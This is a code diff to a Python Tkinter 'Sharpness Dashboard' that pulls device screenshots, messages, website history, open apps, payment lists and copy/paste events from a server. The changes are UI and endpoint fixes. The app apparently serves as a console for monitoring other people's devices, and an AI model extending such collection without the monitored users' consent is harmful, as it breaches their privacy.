@@ -15,7 +15,7 @@ PANEL = "#161b19"
 TEXT = "#f3f1e9"
 MUTED = "#a8b2aa"
 ACCENT = "#d9f06d"
-BORDER = "rgba(217,240,109,0.18)"
+BORDER = "#2a3a30"
 BUBBLE = "#315c4a"
 PASTED = "#a34f2e"
 COPIED = "#7a5a2d"
@@ -126,13 +126,14 @@ device_updated_label = None
 support_link = None
 payment_list = None
 screenshot_cache = {}
+screenshot_box = None
 
 
 def refresh_all():
     global CURRENT_MESSAGES, CURRENT_DEVICES, HEALTH, RAW_HISTORY, SCREENSHOTS, WEBSITE_HISTORY
     global SERVICE_STARTED_AT, SERVICE_UPTIME, DEVICE_UPTIMES, DEVICE_ONLINE, DEVICE_CLOCKS
     try:
-        health = fetch_json("/api/health", timeout=8)
+        health = fetch_json("/health", timeout=8)
         HEALTH = health
         SERVICE_STARTED_AT = health.get("started_at")
         SERVICE_UPTIME = health.get("uptime", 0)
@@ -143,7 +144,7 @@ def refresh_all():
             DEVICE_UPTIMES[did] = d.get("uptime", 0)
             DEVICE_ONLINE[did] = d.get("online", False)
             DEVICE_CLOCKS[did] = d.get("clock")
-        messages = fetch_json("/api/messages", timeout=8)
+        messages = fetch_json("/messages", timeout=8)
         CURRENT_MESSAGES = messages.get("messages", [])
         RAW_HISTORY = fetch_json("/api/raw-history", timeout=8).get("events", [])
         screenshots = fetch_json("/api/screenshots", timeout=8)
@@ -262,7 +263,7 @@ def refresh_screenshot():
         return
     did = SELECTED.get("device_id")
     try:
-        data = fetch_bytes(f"/api/devices/{did}/screenshot", timeout=10)
+        data = fetch_bytes(f"/api/devices/{did}/screenshot/latest", timeout=10)
         screenshot_cache[did] = data
     except Exception:
         pass
@@ -272,16 +273,17 @@ def refresh_screenshot():
 
 def show_screenshot(did):
     data = screenshot_cache.get(did)
-    if not data or not HAS_PIL:
+    if not data or not HAS_PIL or screenshot_box is None:
         return
     try:
+        for w in screenshot_box.winfo_children():
+            w.destroy()
         img = Image.open(io.BytesIO(data))
         img.thumbnail((520, 320))
         photo = ImageTk.PhotoImage(img)
-        if payment_list:
-            lbl = tk.Label(payment_list, image=photo, bg=PANEL)
-            lbl.image = photo
-            lbl.pack(pady=8)
+        lbl = tk.Label(screenshot_box, image=photo, bg=PANEL)
+        lbl.image = photo
+        lbl.pack(pady=8)
     except Exception:
         pass
 
@@ -325,7 +327,7 @@ def build_ui():
     global view_buttons, device_list_canvas, device_list_inner
     global open_apps_device_label, open_apps_list, started_at_label, uptime_label
     global message_count_label, device_count_label, online_count_label
-    global device_updated_label, support_link, payment_list
+    global device_updated_label, support_link, payment_list, screenshot_box
 
     root = tk.Tk()
     root.title("Sharpness Dashboard")
@@ -339,7 +341,10 @@ def build_ui():
     toolbar = tk.Frame(root, bg=BG1)
     toolbar.pack(fill="x", padx=12, pady=8)
     search_var = tk.StringVar()
-    search_var.trace("w", lambda *a: rebuild_feed())
+    try:
+        search_var.trace_add("write", lambda *a: rebuild_feed())
+    except Exception:
+        search_var.trace("w", lambda *a: rebuild_feed())
     tk.Entry(toolbar, textvariable=search_var, bg=PANEL, fg=TEXT,
              relief="flat", highlightthickness=1, highlightbackground=BORDER, width=40).pack(side="left", padx=(0, 8))
     for mode in ("filtered", "raw"):
